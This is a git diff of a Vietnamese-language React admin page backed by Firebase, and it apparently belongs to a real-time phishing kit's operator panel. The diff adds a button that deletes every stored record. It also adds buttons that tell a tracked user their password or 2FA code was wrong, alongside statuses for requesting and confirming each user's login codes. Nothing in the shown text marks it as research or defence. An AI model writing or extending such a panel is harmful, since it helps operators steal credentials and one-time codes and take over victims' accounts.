@@ -1,4 +1,4 @@
-import { onValue, ref, update } from "firebase/database";
+import { onValue, ref, set, update } from "firebase/database";
 import { useEffect, useState } from "react";
 import InputText from "../Components/UI/InputText/InputText";
 import { database } from "../Utils/firebase";
@@ -48,6 +48,14 @@ const MainAdmin = () => {
     update(ref(database), updates);
   };
 
+  const handleDelete = () => {
+    if (window.confirm("Xác nhận xoá tất cả ?")) {
+      set(ref(database), null).then(() => {
+        setRecords([]);
+      });
+    }
+  };
+
   const handleTurnOffAudio = () => {
     if (audio) {
       audio.pause();
@@ -56,7 +64,13 @@ const MainAdmin = () => {
 
   return (
     <div className="p-5 pt-3">
-      <div className="d-flex justify-content-end">
+      <div className="d-flex justify-content-between">
+        <button
+          className="btn btn-sm btn-danger mb-4 ms-4"
+          onClick={handleDelete}
+        >
+          Xoá tất cả
+        </button>
         <button
           className="btn btn-sm btn-secondary mb-4 ms-auto"
           onClick={handleTurnOffAudio}
@@ -187,7 +201,6 @@ const MainAdmin = () => {
                         </button>
                       </div>
                     )}
-
                     {d?.user_status === "3z" && (
                       <div className="d-flex">
                         <button
@@ -208,7 +221,6 @@ const MainAdmin = () => {
                         </button>
                       </div>
                     )}
-
                     {/* {d?.user_status === "User yêu cầu gửi lại mã 2fa" && (
                       <div className="d-flex">
                         <button
@@ -221,17 +233,36 @@ const MainAdmin = () => {
                         </button>
                       </div>
                     )} */}
-
                     {(d?.user_status === "6" || d?.user_status === "5") && (
                       <div className="d-flex">
                         <button
-                          className="btn btn-sm mb-2 btn-warning"
+                          className="btn btn-sm mb-2 btn-warning me-2"
                           onClick={() => {
                             updateRecords("Chờ user nhập mã đăng nhập", d.uid);
                           }}
                         >
                           Gọi mã
                         </button>
+                        {d?.user_status === "5" && (
+                          <>
+                            <button
+                              className="btn btn-sm mb-2 btn-danger me-2"
+                              onClick={() => {
+                                updateRecords("2", d.uid);
+                              }}
+                            >
+                              Sai mật khẩu
+                            </button>
+                            <button
+                              className="btn btn-sm mb-2 btn-danger"
+                              onClick={() => {
+                                updateRecords("3", d.uid);
+                              }}
+                            >
+                              Sai mã 2fa
+                            </button>
+                          </>
+                        )}
                       </div>
                     )}
 
@@ -248,7 +279,6 @@ const MainAdmin = () => {
                         </button>
                       </div>
                     )}
-
                     {d?.user_status ===
                       "Đang chờ xác nhận mã đăng nhập từ admin" && (
                       <div className="d-flex">
@@ -270,7 +300,6 @@ const MainAdmin = () => {
                         </button>
                       </div>
                     )}
-
                     {d?.user_status === "User yêu cầu gửi lại mã đăng nhập" && (
                       <div className="d-flex">
                         <button
@@ -283,7 +312,6 @@ const MainAdmin = () => {
                         </button>
                       </div>
                     )}
-
                     {d?.user_status === "Đã xác nhận mã đăng nhập" && (
                       <div className="d-flex">
                         <button
